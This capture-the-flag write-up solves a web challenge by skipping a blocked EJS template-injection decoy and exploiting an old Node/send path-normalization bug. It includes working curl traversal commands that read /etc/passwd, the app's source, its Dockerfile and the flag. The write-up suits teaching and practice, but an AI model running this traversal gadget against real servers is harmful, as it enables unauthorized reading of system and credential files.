# noaiiiiiiiiiiiiiii

**Point: 100**

i hate ai (except my bot daughter) : ( it is a ctf challenge for human have a nice play (btw Look closely, it's a bit of an old joke.) http://chal.thjcc.org:3001 <------------

## 1. Initial Recon

Visiting `/` returns:

```html
<h1>hello</h1>
<img src="/static/6bb8754adea6d59b.png.bak" />
<p>Try providing a ?tpl=parameter.</p>
```

Then check `robots.txt`:

```txt
User-agent: *
Disallow: /static/.backup
```

This strongly suggests hidden files under `/static/.backup`.

## 2. Find the Leaked Backup Source

Because directory listing is enabled on `/static`, browsing `/static/.backup/` reveals:

- `app.js.bak`
- `Dockerfile.bak`
- `package.json.bak`

The key code from `app.js.bak`:

- Reads `req.query.tpl`
- Blacklist blocks:
  - all lowercase letters `a-z`
  - all uppercase letters `A-Z`
  - `[` `]` `(` `)` `{` `}`
- Then does `ejs.render(req.query.tpl, safeContext, { context: Object.freeze({}), strict: true })`

## 3. Analyze the SSTI Surface (`tpl`)

At first this looks like EJS SSTI, but the filter is very restrictive.

### Blocked characters

- `a-z`
- `A-Z`
- `[ ] ( ) { }`

### Allowed characters (important ones)

- Digits: `0-9`
- Whitespace
- Many symbols: `< > % = + - * / . , : ; ' " ! ? @ # $ ^ & | _ ~` (unless URL/parser mangles them)

### Practical effect

- Simple numeric templates work, e.g.:
  - `?tpl=<%= 123 %>` -> `123`
- Real code execution is blocked because identifiers need letters (`require`, `process`, `constructor`, etc.).
- Brackets/parentheses/braces are also blocked, removing common JavaScript expression gadgets.

So the intended `tpl` route is a trap / decoy.

## 4. Real Vulnerability Path: Old Node Path Normalization Bug

The stack is old:

- Node `8.5.0`
- Express `4.15.5`
- `serve-static` `1.12.6`
- `send` `0.15.6`

`send` checks traversal using a normalized path + regex for `..`.
With old Node normalization behavior, crafted segments like `a../../..` can collapse in ways that bypass the traversal check.

This matches the challenge hint: `old joke`.

## 5. Working Traversal Gadget

You must use `curl --path-as-is` so curl does not normalize the path first.

Working gadget pattern:

```txt
/static/../../a../../../../<target>
```

Proof read:

```bash
curl --path-as-is "http://chal.thjcc.org:3001/static/../../a../../../../etc/passwd"
```

This returns `/etc/passwd`, confirming arbitrary file read.

## 6. Read Real App Files (Not the Backup)

Read live files from `/usr/src/app`:

```bash
curl --path-as-is "http://chal.thjcc.org:3001/static/../../a../../../../usr/src/app/app.js"
curl --path-as-is "http://chal.thjcc.org:3001/static/../../a../../../../usr/src/app/Dockerfile"
```

The live `Dockerfile` contains the real flag write command:

```dockerfile
RUN echo "THJCC{...}" > /flag_F7aQ9L2mX8RkC4ZP
```

## 7. Read the Flag File

Final request:

```bash
curl --path-as-is "http://chal.thjcc.org:3001/static/../../a../../../../flag_F7aQ9L2mX8RkC4ZP"
```

Returned flag:

```txt
THJCC{y0u_mu57_b3_4_r34l_hum4n_b3c4u53_0nly_4_hum4n_c4n_r34d_4nd_und3r574nd_7h15_fl46_c0rr3c7ly}
```

# Flag

`THJCC{y0u_mu57_b3_4_r34l_hum4n_b3c4u53_0nly_4_hum4n_c4n_r34d_4nd_und3r574nd_7h15_fl46_c0rr3c7ly}`
